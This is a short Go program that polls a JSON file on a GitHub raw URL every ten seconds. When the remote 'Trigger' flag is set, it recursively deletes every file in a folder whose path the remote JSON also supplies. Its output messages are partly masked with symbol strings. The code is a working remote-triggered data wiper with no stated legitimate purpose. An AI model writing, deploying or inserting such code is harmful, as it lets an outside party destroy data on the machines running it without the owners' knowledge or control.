package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

type Payload struct {
	Trigger    bool   `json:"Trigger"`
	FolderPath string `json:"folder_path"`
}

func fetchPayload(url string) (Payload, error) {
	resp, err := http.Get(url)
	if err != nil {
		return Payload{}, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return Payload{}, fmt.Errorf("failed to fetch data: %s", resp.Status)
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return Payload{}, err
	}

	var payload Payload
	err = json.Unmarshal(body, &payload)
	if err != nil {
		return Payload{}, fmt.Errorf("failed to unmarshal JSON: %v, response body: %s", err, string(body))
	}

	return payload, nil
}

func executeDeletion(folderPath string) error {
	files, err := ioutil.ReadDir(folderPath)
	if err != nil {
		return fmt.Errorf("failed to read directory: %v", err)
	}

	for _, file := range files {
		filePath := filepath.Join(folderPath, file.Name())

		err := os.RemoveAll(filePath)
		if err != nil {
			return fmt.Errorf("failed to @@@@@@@@@@@@ %s: %v", filePath, err)
		}
	}

	return nil
}

func main() {
	url := "https://raw.githubusercontent.com/disturbd35/disturbd35/main/execute.json"
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	fmt.Println("Server started and ready to check the trigger...")

	for {
		select {
		case <-ticker.C:
			payload, err := fetchPayload(url)
			if err != nil {
				log.Printf("Error fetching payload: %v", err)
				continue
			}

			if payload.Trigger {
				fmt.Println("****************************:")
				err := executeDeletion(payload.FolderPath)
				if err != nil {
					log.Printf("Error execution: %v", err)
				} else {
					fmt.Println("%%%%%%%%%%%%%%%%%%%%%%%%%%")
				}
			} else {
				fmt.Println("Trigger is false, nothing to do.")
			}
		}
	}
}
